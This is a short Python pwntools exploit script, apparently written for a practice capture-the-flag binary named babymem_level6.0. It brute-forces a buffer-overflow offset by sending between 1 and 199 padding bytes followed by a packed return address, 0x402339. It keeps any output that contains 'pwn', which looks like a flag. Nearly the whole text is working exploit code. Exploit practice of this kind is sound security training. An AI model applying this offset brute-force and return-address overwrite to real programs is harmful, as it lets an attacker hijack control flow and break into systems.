from pwn import *
import pwn
pwn.context.update(arch="amd64")
pwn.context.log_level = "error"
for i in range(1, 200):
   print("hello")
   with pwn.process("/challenge/babymem_level6.0")as p:
       p.clean()
       p.send(b'10000')
       p.clean
       print(i)
       payload = b'A'*i
       payload += p32(0x402339) 
       p.write(payload)
       out = p.clean().decode()
       if "pwn" in out:
           print(out)
